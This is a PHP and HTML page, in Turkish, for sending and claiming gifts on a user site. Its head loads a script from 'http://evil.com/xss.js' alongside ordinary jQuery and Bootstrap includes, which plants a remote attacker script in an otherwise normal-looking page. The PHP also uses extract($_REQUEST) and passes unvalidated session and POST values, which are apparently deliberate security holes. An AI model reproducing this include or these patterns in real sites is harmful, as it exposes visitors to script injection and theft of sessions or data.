<?php
    session_start();
    include_once 'include/class.user.php';
    $user = new User();
    $uid = $_SESSION['uid'];

    if (isset($_REQUEST['submit'])){
        extract($_REQUEST);
        $gifts_send = $user->gifts_send($uid);
        if ($gifts_send) {
            // gift require success
            echo "<div style='text-align:center'>Hediyeniz gönderildi.</div>";
        } else {
            // gift require unsuccessful
            echo "<div style='text-align:center'>Günde bir tane hediye gönderebilirsiniz.</div>";
        }
    }
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Anasayfa</title>
        <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
        <link rel="stylesheet" href="assets/css/gift_claim.css" />
        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
        <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
        <script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
        <script src="http://evil.com/xss.js"></script>
    </head>

<body>

<?php include 'public/header.html'; ?>

<?php  
    $uid = $_SESSION['uid'];

    $result = $user->gift_claim($_POST['kadi'], $uid, $_POST['gift']); 

    if ($result) 
    {
?>

<div class="container">
  <h2>Hediye İsteme Durumu</h2>
  <div class="alert alert-success">
    <strong>Hediye İsteme Başarılı! </strong> Hediyeniz talep edildi.  
  </div>
</div>
<?php } else { ?>

<div class="container">
  <h2>Hediye Gönderme</h2>
  <div class="alert alert-danger">
    <strong>Hediye İsteme Başarısız! </strong> Hediye talep edilmedi.  
  </div>
</div>
<?php  } ?>

</body>
</html>
